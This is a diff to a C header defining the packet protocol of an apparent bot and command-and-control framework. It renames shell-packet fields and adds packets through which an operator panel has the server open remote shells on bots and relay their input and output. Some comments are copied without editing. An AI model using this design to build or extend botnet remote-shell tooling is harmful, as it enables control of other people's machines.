@@ -55,16 +55,16 @@ enum {
     */
     LAIKAPKT_SHELL_OPEN, /* if sent to bot, opens a shell. if sent to cnc, signifies you opened a shell */
     /* layout of LAIKAPKT_SHELL_OPEN:
-    *   uint8_t id;
+    *   uint8_t shellID;
     */
     LAIKAPKT_SHELL_CLOSE, /* if sent to bot, closes a shell. if sent to cnc, signifies a shell was closed */
     /* layout of LAIKAPKT_SHELL_CLOSE:
-    *   uint8_t id;
+    *   uint8_t shellID;
     */
     LAIKAPKT_SHELL_DATA, /* if sent to bot, writes data to stdin of shell. if sent to cnc, writes to 'stdout' of shell */
     /* layout of LAIKAPKT_SHELL_DATA
-    *   uint8_t id;
-    *   char buf[VAR_PACKET_LENGTH]
+    *   uint8_t shellID;
+    *   char buf[VAR_PACKET_LENGTH];
     */
 /* ==================================================[[ Auth ]]================================================== */
     LAIKAPKT_AUTHENTICATED_HANDSHAKE_REQ, /* second packet sent by authenticated peers (panel). there is no response packet */
@@ -82,6 +82,20 @@ enum {
     /* layout of LAIKAPKT_AUTHENTICATED_RMV_PEER_RES
     *   uint8_t pubKey[crypto_kx_PUBLICKEYBYTES]; -- pubkey of said bot
     *   uint8_t peerType;
+    */
+    LAIKAPKT_AUTHENTICATED_OPEN_SHELL_REQ, /* panel requesting cnc open a shell on bot */
+    /* layout of LAIKAPKT_AUTHENTICATE_OPEN_SHELL_REQ
+    *   uint8_t pubKey[crypto_kx_PUBLICKEYBYTES]; -- pubkey of said bot
+    */
+    LAIKAPKT_AUTHENTICATED_OPEN_SHELL_RES, /* panel requesting cnc open a shell on bot */
+    /* layout of LAIKAPKT_AUTHENTICATE_OPEN_SHELL_REQ
+    *   uint8_t pubKey[crypto_kx_PUBLICKEYBYTES]; -- pubkey of said bot
+    *   uint8_t shellID; -- shell id of shell opened on bot
+    */
+    LAIKAPKT_AUTHENTICATED_SHELL_DATA, /* if sent to cnc, writes data to stdin of shell. if sent to panel, writes to 'stdout' of shell */
+    /* layout of LAIKAPKT_SHELL_DATA
+    *   uint8_t shellID;
+    *   char buf[VAR_PACKET_LENGTH];
     */
     LAIKAPKT_MAXNONE
 };
